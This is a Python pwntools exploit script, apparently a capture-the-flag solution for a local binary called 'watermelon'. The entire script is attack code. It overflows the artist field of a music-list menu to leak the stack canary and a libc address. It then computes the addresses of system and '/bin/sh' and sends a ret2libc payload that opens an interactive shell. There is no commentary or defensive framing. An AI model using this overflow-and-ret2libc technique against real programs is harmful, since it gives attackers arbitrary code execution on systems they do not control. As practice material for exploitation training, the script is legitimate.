from pwn import *

p = process("./watermelon")

p.recvuntil("Input your name : \n")
p.sendline("c2w2m2")

for i in range(0,100):
	p.recvuntil("select	|\t\n")
	p.sendline("1")
	p.recvuntil("music	|\t")
	p.sendline("music%d"%i)
	p.recvuntil("artist	|\t")
	p.sendline("artits%d"%i)

p.recvuntil("select	|\t\n")
p.sendline("3")
p.recvuntil("select number\t|\t")
p.sendline("100")
p.recvuntil("music	|\t")
p.sendline("music_modify")
p.recvuntil("artist	|\t")
p.sendline("A"*20)

p.recvuntil("select	|\t\n")
p.sendline("2")
p.recvuntil("A"*20)
canary = u32(p.recv(4)[0:]) - 0xa
print "0x%x" % canary

p.recvuntil("select	|\t\n")
p.sendline("3")
p.recvuntil("select number\t|\t")
p.sendline("100")
p.recvuntil("music	|\t")
p.sendline("music_modify")
p.recvuntil("artist	|\t")
p.sendline("A"*20 + "A"*16)

p.recvuntil("select	|\t\n")
p.sendline("2")
p.recvuntil("A"*36)
libc = u32(p.recv(4)[0:]) - 0x0a
print "0x%x" % libc

libc_base = libc - 0x18600
system = libc_base + 0x3ada0
binsh = libc_base + 0x15B9A8 + 3

pay = "A"*20 + p32(canary) + "A"*12 + p32(system) + "ABCD" + p32(binsh)

p.recvuntil("select	|\t\n")
p.sendline("3")
p.recvuntil("select number\t|\t")
p.sendline("100")
p.recvuntil("music	|\t")
p.sendline("music_modify")
p.recvuntil("artist	|\t")
p.sendline(pay)

p.recvuntil("select	|\t\n")
p.sendline("4")

p.interactive()
